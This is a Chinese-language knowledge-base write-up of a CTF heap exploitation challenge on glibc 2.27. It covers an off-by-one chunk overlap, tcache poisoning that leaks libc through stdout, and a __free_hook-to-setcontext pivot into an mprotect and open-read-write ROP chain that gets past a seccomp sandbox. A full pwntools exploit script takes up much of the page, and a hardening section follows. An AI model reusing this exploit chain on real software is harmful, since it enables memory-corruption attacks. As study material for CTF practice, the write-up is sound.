---
id: ctf-pwn-offbyone-tcache-stdout-leak-mprotect-orw-sandbox
title: 无 show 的 off-by-one 堆题：tcache 与 unsorted 叠块改 stdout 泄 libc，再 setcontext 走 mprotect+ORW 绕沙箱
type: scenario
domain: ctf
path: ctf/pwn
technique: offbyone-tcache-unsorted-overlap-stdout-fsop-leak-mprotect-orw
tags:
- ctf
- pwn
- heap
- off-by-one
- tcache
- unsorted-bin
- stdout
- fsop
- mprotect
- orw
- sandbox
cve: []
severity: low
confidence: medium
status: verified
created: '2026-11-07'
updated: '2026-11-08'
verification:
  verified_by: verifier-T2-3W
  verified_at: '2026-11-08T17:18:10+08:00'
  notes: 已对照原文核对；本次核对未读取图片；libc 2.27 off-by-one、无 show、堆 size 无限制、tcache 与 unsorted 两次叠块、tcache bin attack 改低 2 字节到 stdout、stdout FSOP 泄 libc（减 0x3ed8b0）、setcontext+53 改 __free_hook、mprotect+ORW 绕沙箱，均与原文正文与 exp 一致；未验证点：exp 未在本机执行，原文以动态调试截图给出关键状态
url: /docs/ctf/pwn/ctf-pwn-offbyone-tcache-stdout-leak-mprotect-orw-sandbox/
draft: false
kb_aliases:
- 无 show 堆题泄 libc
- stdout 攻击泄 libc
- tcache bin attack 低 2 字节改 stdout
- mprotect + ORW 绕沙箱
- setcontext 栈迁移
---

## 一句话结论

题目没有 show 函数、只给了 off-by-one 与不受限的 size 时，可以把 tcache 块和 unsorted bin 块叠在同一段内存上拿到 libc 指针，再用 tcache poisoning 只改末尾 2 字节把分配落到 `_IO_2_1_stdout_`，覆写 `_flags`/`_IO_write_base` 让下一次落盘的输出带出 libc 地址；有了 libc 后把 `__free_hook` 改成 `setcontext+53` 做栈迁移，落到 `mprotect` 打可执行 + ORW 读 flag，绕过 prctl/seccomp 沙箱。

## 原理

- off-by-one（`edit` 时多写 1 字节）可以改相邻 chunk 的 `size` 低字节，把 `0x61 → 0xd1` 等，实现“chunk 扩大/缩小”造成**堆块重叠**：让新申请的块覆盖仍挂在 unsorted bin 里的块的 `fd/bk`，即同时持有“已释放进入 unsorted 的块”和“新分配可写的块”，从而读写 unsorted bin 的链表指针——这些指针是 `main_arena + 96` 之类的 libc 地址。
- 没有 show 就必须让**程序自己把 libc 地址打印出来**。stdout 的 `_IO_FILE` 结构里 `_IO_write_base` 与 `_IO_write_ptr` 决定 `puts/printf` 的输出区间；把 `_flags` 设为 `0xfbad1800`（清 `_IO_USER_BUF` 等标志、保留 `_IO_CURRENTLY_PUTTING` 相关位），再把 `_IO_write_base` 指到想泄露的地址、`_IO_write_ptr` 指到 base+长度，下一次 flush 的输出缓冲就变成“从泄漏地址开始的内容”。
- 落到 stdout 的方法：tcache poisoning。把目标块 `free` 进 tcache 后用 UAF 覆写其 `next` 指针。因为 heap 与 libc 的高位在同一段 `0x7f` 区域，通常只需改 `next` 的低 2 字节（`0x...c760` 之类）就能指向 `_IO_2_1_stdout_`；改完连续 `add` 两次，第二次返回的块即 stdout 结构体。
- 严格 sandbox 禁止 `execve`，因此不能直接 `system("/bin/sh")`：改走 `mprotect(heap_page, 0x2000, PROT_READ|WRITE|EXEC)` 把堆页设为可执行，然后把栈迁移（`setcontext+53`，从 `rdi` 指向的 ucontext 恢复 `rsp` 等寄存器）到一段写好的 ORW ROP 链上，或直接跳到堆上 shellcode。
- `setcontext+53` 的偏移在 glibc 2.27 上与 `__free_hook` 用法配合稳定：`free(buf)` 时 `__free_hook(buf)` 被调用，`rdi = buf` 正好是攻击者可控的 ucontext 区首地址，迁移目标与寄存器都由该区内容决定，所以布局要构造成 ucontext（`rsp` 在固定 offset，`rip` 可直接跳 `mprotect`）。

## 触发条件

- 存在 off-by-one 或类似可改相邻 chunk size 的写原语，且 size 不受限（能申请到 unsorted bin 级别的大块）。
- 程序没有 show/打印堆内容的接口，但存在会输出数据的路径（菜单、提示、错误信息）。
- glibc 版本中 `tcache` 可用（≥2.26）；目标地址与堆地址低 2 字节可对上。
- 沙箱禁用 `execve`，但允许 `mprotect`/`open/read/write`。

## 利用步骤

1. 申请 0x58/0x68 等块，用 off-by-one 改 size 制造重叠；把一块留在 unsorted bin，另一块保留可写，读出/改写 `fd`。
2. 通过 `gift` 类接口（或其它泄露）拿到 heap 基址，作为后续 `next` 指针的高位。
3. 把 tcache 块 `free` 后用 UAF 覆写 `next` 为 `heap_addr`，形成 “tcache 与 unsorted 叠在同一块” 的第一次堆叠，再 `add` 回来。
4. 释放若干 0x38 小块，`edit` 制造第二次堆叠，把某个 tcache 链的 `next` 改成 `_IO_2_1_stdout_` 的低 2 字节。
5. 连续 `add` 两次拿到 stdout 结构体，写入 `p64(0xfbad1800) + p64(0)*3 + b'\x00'`，触发一次输出，`recvuntil` 里出现 `0x7f` 结尾的 6 字节即为 libc 指针，减已知偏移得 libc 基址。
6. 用同样手法 tcache poison 到 `__free_hook`，写入 `setcontext+53`；构造 ucontext：`rsp` 指向堆上 ROP 链、`rip` 指向 `mprotect`（或整链直接放 ORW）。
7. ROP：`mprotect(page, 0x2000, 7)` → 跳到堆上 ORW 链或 shellcode：`open("flag")`、`read(3, buf, 0x30)`、`write(1, buf, 0x30)`。

## PoC

关键片段（结构，地址需按目标调整）：

```python
from pwn import *
mx = process('./ezheap'); elf = ELF('./ezheap'); libc = elf.libc

# 1) off-by-one 改 size，制造 tcache/unsorted 重叠
add(0, 0x58); add(1, 0x58); add(2, 0x68)
edit(0, b'\x00'*0x58 + p8(0xd1))     # 0x61 -> 0xd1
delete(1); add(1, 0xc0)
delete(2); add(3, 0x58); add(4, 0x3f8)
add(5, 0x38); add(6, 0x38); add(7, 0x38)
edit(3, b'\x00'*0x58 + p8(0xc1))     # 再造一次重叠
add(8, 0xf8); delete(4); delete(5); add(9, 0x3f8)

gift(1); heap_addr = int(mx.recv(14), 16)      # 泄露 heap 基址
edit(1, b'a'*0x58 + p64(0x71) + p64(heap_addr))

# 2) 第一次堆叠：tcache 与 unsorted 同块
add(10, 0x68); add(11, 0x68)
edit(11, b'\x60' + b'\xc7')                    # 低 2 字节指向 _IO_2_1_stdout_ 附近

# 3) stdout FSOP 泄 libc
add(12, 0x38); add(13, 0x38)
edit(13, p64(0xfbad1800) + p64(0)*3 + b'\x00')
libc_addr = u64(mx.recvuntil(b'\x7f')[-6:].ljust(8, b'\x00')) - 0x3ed8b0
libc.address = libc_addr

# 4) 打 __free_hook -> setcontext+53，并铺 mprotect + ORW
add_(14, 0x28); add_(15, 0x28); add_(16, 0x28)
edit_(14, b'\x00'*0x28 + p8(0x61)); delete_(15); add_(15, 0x58); delete_(16)
edit_(15, b'a'*0x28 + p64(0x31) + p64(libc.sym['__free_hook']))
add_(17, 0x28); add_(18, 0x28)
edit_(18, p64(libc.sym['setcontext'] + 53))

pop_rdi = libc_addr + 0x2164f; pop_rsi = libc_addr + 0x23a6a; pop_rdx = libc_addr + 0x1b96
flag_addr = heap_addr - 0x590
orw  = p64(pop_rdi)+p64(flag_addr)+p64(pop_rsi)+p64(0)+p64(pop_rdx)+p64(0)+p64(libc.sym['open'])
orw += p64(pop_rdi)+p64(3)+p64(pop_rsi)+p64(flag_addr)+p64(pop_rdx)+p64(0x30)+p64(libc.sym['read'])
orw += p64(pop_rdi)+p64(1)+p64(pop_rsi)+p64(flag_addr)+p64(pop_rdx)+p64(0x30)+p64(libc.sym['write'])
edit_(9, orw)

p1  = b''.ljust(0x68, b'\x00') + p64(heap_addr - 0x7f0)
p1  = p1.ljust(0x70, b'\x00') + p64(0x2000)
p1  = p1.ljust(0x78, b'\x00') + p64(heap_addr - 0x400)
p1  = p1.ljust(0x88, b'\x00') + p64(7)
p1  = p1.ljust(0xa0, b'\x00') + p64(heap_addr - 0x400)
p1  = p1.ljust(0xa8, b'\x00') + p64(libc.sym['mprotect'])
edit_(8, p1); delete_(8)     # free -> __free_hook -> setcontext -> mprotect -> ORW
mx.interactive()
```

## 变体与关联

- 变体：有 show 时可直接读 unsorted `fd`/`bk`，跳过 stdout FSOP，直接打 `__free_hook`/`__malloc_hook`。
- 变体：glibc 2.32+ 移除 hooks 后改打 `_IO_list_all`/`_IO_str_jumps` 或 `exit_funcs`，思路仍是“把结构体指针改到可控区”。
- 变体：泄漏目标可以是 `environ`（泄栈地址）→ 直接写返回地址；也可以只改 3 字节适配非页对齐的 stdout 地址。
- 关联：[[ctf-pwn-tcache-poison-global-note-array-flagbuf-print]]（tcache poisoning + 全局数组回读）、[[ctf-pwn-uaf-low4byte-next-fake-unsorted-overlap-freehook]]（低字节改 next 的重叠构造）、[[ctf-pwn-negative-index-pointer-array-stdout-freehook-system]]（stdout 泄露 + free_hook）、[[ctf-pwn-signal-handler-rt-sigframe-srop-orw]]（另一条 ORW 路线）。
- 边界：分配 size 受限（只能拿小 bin）时无法与 unsorted 叠块；heap 与 stdout 低 2 字节不一致时需先泄露并用 3 字节覆写；沙箱允许 execve 时可省掉 mprotect。

## 检测与防御

- 本题为 CTF 题，工程侧对应加固：用 glibc ≥2.32 移除 `__free_hook`/`__malloc_hook`；开启 tcache 的 double-free 检测与 safe-linking（2.32+）；对 size 字段做完整性校验、禁止用户直接指定任意大 size。
- 输出侧：不要用 `fwrite`/`puts` 直接输出用户可控指针指向的内存；stdio 结构体不应可被用户写。
- 沙箱设计：仅靠 seccomp 禁 execve 并不阻止 ORW 读 flag，flag 应通过隔离的读取通道下发而非放在进程可读文件。
